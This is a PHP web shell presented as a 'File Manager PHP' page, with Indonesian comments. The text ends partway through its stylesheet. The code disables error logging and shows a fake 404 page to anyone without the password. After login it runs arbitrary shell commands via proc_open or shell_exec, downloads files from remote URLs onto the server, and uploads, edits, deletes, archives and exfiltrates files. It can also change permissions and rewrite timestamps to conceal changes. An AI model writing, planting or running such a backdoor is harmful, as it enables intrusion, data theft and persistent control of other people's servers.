<?php
@ob_start();
@session_start();
@set_time_limit(0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
error_reporting(0);
ini_set("display_errors", 0);
ini_set("log_errors", 0);
ini_set('error_log', '');

// --- Konfigurasi Baru ---
$pass = "93880f28547fd91b76e33484d560f94d129b8aa250d181307107e3af70c05f5b";

function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

// --- Autentikasi ---
if(!empty($pass)) {
    if(isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $pass)) {
        prototype(md5($_SERVER['HTTP_HOST']), $pass);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pass)) {
        hardLogin();
    }
}

function hardLogin() {
    header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta 
name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="shortcut icon" type="image/png" 
 /> <style> body { font-family: monospace; } input[type="password"] { border: none; 
padding: 2px; } input[type="password"]:focus { outline: none; } input[type="submit"] { border: none; padding: 4px 20px; background-color: 
#2e313d; color: #FFF; } </style> </head> <body> <form action="" method="post"> <div align="center"> <input type="password" name="pass" 
placeholder=""></div> </form> </body> </html>');
}

// --- Tangani Logout ---
if (isset($_POST['logout'])) {
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
    session_destroy();
    session_unset();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Manajemen Direktori ---
if (isset($_POST['go_dir'])) {
    $dir = realpath($_POST['go_dir']);
    if ($dir && is_dir($dir)) {
        $_SESSION['current_dir'] = $dir;
        unset($_SESSION['view_file'], $_SESSION['edit_file']);
    }
} elseif (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = realpath(getcwd());
}
$current_dir = $_SESSION['current_dir'];

// --- Simpan metode command yang dipilih ---
if (isset($_POST['command_method'])) {
    $_SESSION['command_method'] = $_POST['command_method'];
}

// Gunakan metode default jika belum ada session
$command_method = isset($_SESSION['command_method']) ? $_SESSION['command_method'] : 'proc_open';

// --- Melihat File ---
if (isset($_POST['view_file'])) {
    $vf = realpath($_POST['view_file']);
    if ($vf && is_file($vf) && strpos($vf, $current_dir) === 0) {
        $_SESSION['view_file'] = $vf;
        unset($_SESSION['edit_file']);
    }
}

// --- Mengedit File ---
if (isset($_POST['edit_file'])) {
    $ef = realpath($_POST['edit_file']);
    if ($ef && is_file($ef) && strpos($ef, $current_dir) === 0) {
        $_SESSION['edit_file'] = $ef;
        unset($_SESSION['view_file']);
    }
}

// --- Handle close view file ---
if (isset($_POST['close_view_file'])) {
    unset($_SESSION['view_file']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Touch File/Folder ---
if (isset($_POST['touch_value'], $_POST['save_touch'])) {
    $f = realpath($_POST['save_touch']);
    $timestamp = strtotime($_POST['touch_value']);
    
    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
    $is_current_dir = ($f === realpath($current_dir));
    $is_parent_dir = ($f === realpath(dirname($current_dir)));
    
    if ($f && (is_file($f) || is_dir($f)) && $timestamp !== false && ($is_current_dir || $is_parent_dir || (strpos($f, $current_dir) === 0))) {
        if (touch($f, $timestamp)) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Timestamp updated successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to update timestamp.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file/folder or timestamp format.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Simpan konten file yang diedit
if (isset($_POST['edit_content'], $_POST['save_edit_file'])) {
    $f = realpath($_POST['save_edit_file']);
    if ($f && is_file($f) && is_writable($f) && strpos($f, $current_dir) === 0) {
        // Mengizinkan konten kosong (string kosong)
        $content = $_POST['edit_content']; // Bisa berupa string kosong
        if (file_put_contents($f, $content) !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File edited successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to edit file.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file or not writable.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Penghapusan File dan Direktori ---
function deleteDir($dir) {
    if (!is_dir($dir)) return false;
    $items = scandir($dir);
    $success = true;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            if (!deleteDir($path)) $success = false;
        } else {
            if (!@unlink($path)) $success = false;
        }
    }
    if (!@rmdir($dir)) $success = false;
    return $success;
}

// Tangani penghapusan item tunggal
if (isset($_POST['delete_single_item'])) {
    $user_input_path = trim($_POST['delete_item_name']);
    $path_to_actually_delete = null;

    $potential_path_relative = $current_dir . DIRECTORY_SEPARATOR . $user_input_path;
    $resolved_path_relative = realpath($potential_path_relative);
    $resolved_path_absolute = realpath($user_input_path);

    if ($resolved_path_relative && (is_file($resolved_path_relative) || is_dir($resolved_path_relative)) && strpos($resolved_path_relative, $current_dir) === 0) {
        $path_to_actually_delete = $resolved_path_relative;
    } else {
        if ($resolved_path_absolute && (is_file($resolved_path_absolute) || is_dir($resolved_path_absolute))) {
            $path_to_actually_delete = $resolved_path_absolute;
        }
    }

    if ($path_to_actually_delete) {
        if (is_dir($path_to_actually_delete)) {
            if (deleteDir($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } elseif (is_file($path_to_actually_delete)) {
            if (@unlink($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete file "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Item not found or not a valid file/folder.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid path or item out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ekstraksi ZIP Individual ---
if (isset($_POST['extract_zip'])) {
    $file_path = realpath($_POST['extract_zip']);
    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'zip' && strpos($file_path, $current_dir) === 0) {
        $zip = new ZipArchive;
        if ($zip->open($file_path) === TRUE) {
            $extract_path = dirname($file_path);
            if ($zip->extractTo($extract_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
            }
            $zip->close();
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open ZIP file "' . htmlspecialchars(basename($file_path)) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid ZIP file or out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ekstraksi TAR.GZ Individual ---
if (isset($_POST['extract_tar'])) {
    $file_path = realpath($_POST['extract_tar']);
    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'gz' && substr($file_path, -7) === '.tar.gz' && strpos($file_path, $current_dir) === 0) {
        try {
            $phar = new PharData($file_path);
            $extract_path = dirname($file_path);
            if ($phar->extractTo($extract_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
            }
            unset($phar);
        } catch (Exception $e) {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract TAR.GZ file: ' . htmlspecialchars($e->getMessage())];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid TAR.GZ file or out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Get File dari URL ---
if (isset($_POST['get_file_url'], $_POST['get_file_name'])) {
    $url = trim($_POST['get_file_url']);
    $filename = trim($_POST['get_file_name']);
    
    if (!empty($url) && !empty($filename)) {
        $file_content = @file_get_contents($url);
        
        if ($file_content !== false) {
            $target_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
            
            if (file_put_contents($target_path, $file_content) !== false) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($filename) . '" downloaded successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to save file "' . htmlspecialchars($filename) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file from URL.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'URL and filename are required.'];
    }
    
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Tindakan Massal ---
if (isset($_POST['bulk_action'], $_POST['items']) && is_array($_POST['items'])) {
    $clean_items = array();
    $success_count = 0;
    $fail_count = 0;
    foreach ($_POST['items'] as $item_path) {
        $r = realpath($item_path);
        if ($r && strpos($r, $current_dir) === 0) {
            $clean_items[] = $r;
        }
    }

    switch ($_POST['bulk_action']) {
        case 'delete':
            foreach ($clean_items as $p) {
                if (is_dir($p) ? deleteDir($p) : @unlink($p)) {
                    $success_count++;
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' item(s) deleted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' item(s) deleted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete any items.'];
            }
            break;
        case 'zip':
            $zip_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.zip';
            $zip = new ZipArchive();

            if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                foreach ($clean_items as $p) {
                    if (is_dir($p)) {
                        $base_name = basename($p);
                        $iterator = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::SELF_FIRST
                        );
                        $zip->addEmptyDir($base_name);

                        foreach ($iterator as $file) {
                            $file_path = $file->getRealPath();
                            $relative_path_in_zip = $base_name . DIRECTORY_SEPARATOR . substr($file_path, strlen($p) + 1);

                            if ($file->isFile()) {
                                $zip->addFile($file_path, $relative_path_in_zip);
                            } elseif ($file->isDir()) {
                                if ($file_path !== $p) {
                                    $zip->addEmptyDir($relative_path_in_zip);
                                }
                            }
                        }
                    } else {
                        $zip->addFile($p, basename($p));
                    }
                }
                if ($zip->close()) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.zip successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create zip archive.'];
                }
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open zip archive.'];
            }
            break;
        case 'tar':
            $tar_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar';
            $tgz_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar.gz';
            try {
                @unlink($tar_file_path); @unlink($tgz_file_path);
                $phar = new PharData($tar_file_path);
                foreach ($clean_items as $p) {
                    $base_name = basename($p);
                    if (is_dir($p)) {
                        // Tambahkan folder utama ke arsip
                        $phar->addEmptyDir($base_name);
                        
                        // Fungsi untuk menambahkan semua item dalam direktori
                        $addItems = function($dir, $baseDir) use (&$phar, &$addItems) {
                            $items = scandir($dir);
                            foreach ($items as $item) {
                                if ($item === '.' || $item === '..') continue;
                                
                                $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
                                $relativePath = $baseDir . DIRECTORY_SEPARATOR . $item;
                                
                                if (is_dir($fullPath)) {
                                    // Tambahkan folder ke arsip
                                    $phar->addEmptyDir($relativePath);
                                    // Rekursif untuk subfolder
                                    $addItems($fullPath, $relativePath);
                                } else {
                                    // Tambahkan file ke arsip
                                    $phar->addFile($fullPath, $relativePath);
                                }
                            }
                        };
                        
                        // Mulai proses penambahan
                        $addItems($p, $base_name);
                    } else {
                        // Untuk file biasa
                        $phar->addFile($p, $base_name);
                    }
                }
                if ($phar->compress(Phar::GZ)) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.tar.gz successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to compress to tar.gz.'];
                }
                unset($phar);
                @unlink($tar_file_path);
            } catch (Exception $e) {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create tar.gz archive: ' . htmlspecialchars($e->getMessage())];
            }
            break;
        case 'unzip':
            $success_count = 0;
            $fail_count = 0;
            foreach ($clean_items as $p) {
                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'zip') {
                    $zip = new ZipArchive;
                    if ($zip->open($p) === TRUE) {
                        $extract_path = dirname($p);
                        if ($zip->extractTo($extract_path)) {
                            $success_count++;
                        } else {
                            $fail_count++;
                        }
                        $zip->close();
                    } else {
                        $fail_count++;
                    }
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
            }
            break;
        case 'untar':
            $success_count = 0;
            $fail_count = 0;
            foreach ($clean_items as $p) {
                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'gz' && substr($p, -7) === '.tar.gz') {
                    try {
                        $phar = new PharData($p);
                        $extract_path = dirname($p);
                        if ($phar->extractTo($extract_path)) {
                            $success_count++;
                        } else {
                            $fail_count++;
                        }
                        unset($phar);
                    } catch (Exception $e) {
                        $fail_count++;
                    }
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
            }
            break;
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Pembuatan Folder Baru ---
if (isset($_POST['newfolder_name'])) {
    $new_folder_name = trim($_POST['newfolder_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_folder_name;
    if ($new_folder_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (mkdir($full_path)) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars($new_folder_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create folder "' . htmlspecialchars($new_folder_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid folder name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Pembuatan File Baru ---
if (isset($_POST['create_file'])) {
    $new_file_name = trim($_POST['newfile_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_file_name;
    if ($new_file_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (file_put_contents($full_path, "") !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($new_file_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create file "' . htmlspecialchars($new_file_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Upload File ---
if (isset($_FILES['uploadfile'])) {
    $uf = $_FILES['uploadfile'];
    if ($uf['error'] === UPLOAD_ERR_OK) {
        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($uf['name']);
        if (strpos(realpath(dirname($target_path)), $current_dir) === 0) {
            if (move_uploaded_file($uf['tmp_name'], $target_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($uf['name'])) . '" uploaded successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to upload file "' . htmlspecialchars(basename($uf['name'])) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Upload target path out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'File upload error: ' . $uf['error']];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Download File ---
if (isset($_POST['download'])) {
    $dl = realpath($_POST['download']);
    if ($dl && is_file($dl) && strpos($dl, $current_dir) === 0) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl).'"');
        readfile($dl);
        exit;
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file: Invalid path or out of scope.'];
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// --- Ganti Nama File/Folder ---
if (isset($_POST['rename'], $_POST['rename_new'])) {
    $o = realpath($_POST['rename']);
    $n = basename($_POST['rename_new']);
    if ($o && $n && strpos($o, $current_dir) === 0) {
        $new_path = dirname($o) . DIRECTORY_SEPARATOR . $n;
        if (strpos(realpath(dirname($new_path)), $current_dir) === 0) {
            if (rename($o, $new_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Item "' . htmlspecialchars(basename($o)) . '" renamed to "' . htmlspecialchars($n) . '" successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to rename "' . htmlspecialchars(basename($o)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'New path for rename is out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid rename parameters or old path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ubah Izin File/Folder ---
if (isset($_POST['chmod'], $_POST['chmod_value'])) {
    $t = realpath($_POST['chmod']);
    $cv = $_POST['chmod_value'];
    
    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
    $is_current_dir = ($t === realpath($current_dir));
    $is_parent_dir = ($t === realpath(dirname($current_dir)));
    
    if ($t && preg_match('/^[0-7]{3,4}$/', $cv) && ($is_current_dir || $is_parent_dir || (strpos($t, $current_dir) === 0))) {
        if (chmod($t, octdec($cv))) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Permissions for "' . htmlspecialchars(basename($t)) . '" changed to ' . htmlspecialchars($cv) . ' successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to change permissions for "' . htmlspecialchars(basename($t)) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid chmod parameters or path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Eksekusi Perintah ---
$cmdout = '';
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    
    // Pengecekan ketersediaan fungsi
    $shell_exec_available = function_exists('shell_exec');
    $proc_open_available = function_exists('proc_open');
    
    if (!$shell_exec_available && !$proc_open_available) {
        $cmdout = "<pre>Error: Neither shell_exec nor proc_open functions are available on this server.</pre>";
    } else if ($command_method === 'proc_open') {
        if (!$proc_open_available) {
            $cmdout = "<pre>Error: proc_open function is not available on this server. Please use shell_exec instead.</pre>";
        } else {
            // Eksekusi dengan proc_open (kode asli)
            $des=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
            $pr=proc_open($command,$des,$pipes,$current_dir);
            if (is_resource($pr)) {
                fclose($pipes[0]);
                $out=stream_get_contents($pipes[1]); fclose($pipes[1]);
                $err=stream_get_contents($pipes[2]); fclose($pipes[2]);
                $rc=proc_close($pr);
                $cmdout="<pre>Output:\n".htmlspecialchars($out)."\nError:\n".htmlspecialchars($err)."\nReturn code: $rc</pre>";
            } else {
                $cmdout="<pre>Error: Failed to execute command using proc_open.</pre>";
            }
        }
    } elseif ($command_method === 'shell_exec') {
        if (!$shell_exec_available) {
            $cmdout = "<pre>Error: shell_exec function is not available on this server. Please use proc_open instead.</pre>";
        } else {
            // Eksekusi dengan shell_exec
            $output = shell_exec($command);
            if ($output === null) {
                $cmdout="<pre>Error: Failed to execute command using shell_exec.</pre>";
            } else {
                $cmdout="<pre>Output:\n".htmlspecialchars($output)."</pre>";
            }
        }
    }
}

// --- Handle AJAX request for file content ---
if (isset($_GET['get_file_content'])) {
    $file_path = realpath($_GET['get_file_content']);
    if ($file_path && is_file($file_path) && strpos($file_path, $current_dir) === 0) {
        echo file_get_contents($file_path);
    }
    exit;
}

// --- Fungsi Pembantu ---
function permsToString($perms, $file_path, $current_uid, $current_gid) {
    $info_chars_raw = '';

    $owner_id = fileowner($file_path);
    $group_id = filegroup($file_path);

    $is_regular_file = (($perms & 0x8000) == 0x8000);
    $is_writable_by_owner = (($perms & 0x0080) ? true : false);

    if (($perms & 0xC000) == 0xC000) $info_chars_raw .= 's';
    elseif (($perms & 0xA000) == 0xA000) $info_chars_raw .= 'l';
    elseif (($perms & 0x8000) == 0x8000) $info_chars_raw .= '-';
    elseif (($perms & 0x6000) == 0x6000) $info_chars_raw .= 'b';
    elseif (($perms & 0x4000) == 0x4000) $info_chars_raw .= 'd';
    elseif (($perms & 0x2000) == 0x2000) $info_chars_raw .= 'c';
    elseif (($perms & 0x1000) == 0x1000) $info_chars_raw .= 'p';
    else $info_chars_raw .= 'u';

    $info_chars_raw .= (($perms & 0x0100) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0080) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0020) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0010) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0004) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0002) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    $overall_perms_color_style = '';
    if (($owner_id !== $current_uid && $current_uid !== null) || ($group_id !== $current_gid && $current_gid !== null)) {
        $overall_perms_color_style = 'color: white;';
    } else {
        if ($is_writable_by_owner) {
            $overall_perms_color_style = 'color: #00FF00;';
        } else {
            $overall_perms_color_style = 'color: red;';
        }
    }

    $type_char = substr($info_chars_raw, 0, 1);
    $colored_type_char = '';
    if (($perms & 0xC000) == 0xC000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0xA000) == 0xA000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x8000) == 0x8000) $colored_type_char = '<span style="color:white;">' . $type_char . '</span>';
    elseif (($perms & 0x6000) == 0x6000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x4000) == 0x4000) $colored_type_char = '<span style="color:#00FF00;">' . $type_char . '</span>';
    elseif (($perms & 0x2000) == 0x2000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x1000) == 0x1000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    else $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';

    return $colored_type_char . '<span style="' . $overall_perms_color_style . '">' . substr($info_chars_raw, 1) . '</span>';
}

function makeBreadcrumb($path) {
    $path = realpath($path);
    if ($path === false) return "";
    $crumbs = array();
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $acc = DIRECTORY_SEPARATOR;
    $crumbs[] = '<form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars(DIRECTORY_SEPARATOR).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">/</button></form>';
    $first = true;
    foreach ($parts as $p) {
        if (empty($p)) continue;
        $acc .= $p;
        if ($first) {
            // Bagian pertama setelah root: tambahkan spasi di depan
            $crumbs[] = ' <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
            $first = false;
        } else {
            // Bagian berikutnya: tambahkan " /" di depan
            $crumbs[] = ' / <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
        }
        $acc .= DIRECTORY_SEPARATOR;
    }
    return implode('', $crumbs);
}

function formatSize($b) {
    if ($b>=1073741824) return number_format($b/1073741824,2)." GB";
    if ($b>=1048576) return number_format($b/1048576,2)." MB";
    if ($b>=1024) return number_format($b/1024,2)." KB";
    return $b." B";
}

function getPermsOctal($filepath) {
    return substr(decoct(fileperms($filepath)), -4);
}

$view_file = isset($_SESSION['view_file']) ? $_SESSION['view_file'] : null;
$edit_file = isset($_SESSION['edit_file']) ? $_SESSION['edit_file'] : null;

$view_content = null;
if ($view_file && !$edit_file && is_file($view_file)) {
    $view_content = file_get_contents($view_file);
}
$edit_content = null;
if ($edit_file && is_file($edit_file)) {
    $edit_content = file_get_contents($edit_file);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager PHP</title>
    
    <style>

        body {
            font-family: monospace;
            background: black;
            color: white;
            margin: 0;
            padding: 10px;
            cursor: default;
        }
        button.action-btn {
            background: #aa2222;
            border: none;
            color: white;
            padding: 5px 10px;
            margin: 0;
            cursor: pointer;
            border-radius: 3px;
            font-family: monospace;
            font-size: 14px;
        }
        button.action-btn:hover {
            background: #dd4444;
        }
        .actions-cell form {
            display: inline;
            margin: 0;
            padding: 0;
        }
        .actions-cell form:not(:last-child):after {
            content: " | ";
            color: #ff6666;
            padding: 0 4px;
        }
        .actions-cell button:not(:last-child):after {
            content: " | ";
            color: #ff6666;
            padding: 0 4px;
        }
        /* CSS khusus untuk bagian Viewing File */
        .view-actions form:not(:last-child):after {
            content: " ";
            color: transparent;
        }
        .view-actions button:not(:last-child):after {
            content: " ";
            color: transparent;
        }
        .view-actions form, .view-actions button {
            margin-right: 4px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        th, td {
            border: 1px solid #444;
            padding: 6px 8px;
            text-align: left;
            vertical-align: middle;
        }
        th {
            background: #222;
        }
        tr:nth-child(even) {
            background: #111;
        }
        .checkbox-col {
            width: 22px;
            text-align: center;
        }
        input[type=text], textarea {
            background: black;
            color: white;
            border: 1px solid #444;
            padding: 4px;
            font-size: 14px;
            cursor: text;
        }
        input[type=submit], input[type=button] {
            background: #aa2222;
            border: none;
            color: white;
            padding: 6px 12px;
            cursor: pointer;
            border-radius: 3px;
        }
        input[type=submit]:hover, input[type=button]:hover {
            background: #dd4444;
        }
        textarea {
            width:100%;
            height:400px;
        }
        .action-row {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .action-row form {
            margin-right: 15px;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
        }
        .action-row input[type="text"],
        .action-row input[type="submit"] {
            height: 30px;
            vertical-align: middle;
            box-sizing: border-box;
            margin-right: 5px;
        }
        .action-row input[type="text"]:last-child,
        .action-row input[type="submit"]:last-child {
            margin-right: 0;
        }
        .command-form {
            margin-top:20px;
            margin-bottom:20px;
        }
        .file-content {
            white-space: pre-wrap;
            background:#111;
            border:1px solid #444;
            padding:10px;
            margin-bottom:20px;
            max-height: 400px;
            overflow-y: auto;
            cursor: text;
        }
        .edit-form, .touch-form {
            margin-bottom: 20px;
        }
        .debug-message {
            background-color: #333;
            border: 1px solid #666;
            padding: 10px;
            margin-bottom: 15px;
            color: #ffdd00;
            font-size: 0.9em;
        }
        .user-group-diff {
            color: white;
        }
        .perms-green {
            color: #00FF00;
        }
        .perms-red {
            color: red;
        }
        .perms-white {
            color: white;
        }
        .touch-input {
            width: 200px;
            text-align: center;
        }
        .clickable-date {
            cursor: pointer;
            color: white;
        }
        .clickable-date:hover {
            color: #ff6666;
        }
        .form-container {
            display: none;
            margin-bottom: 20px;
            background: #111;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
        }
        
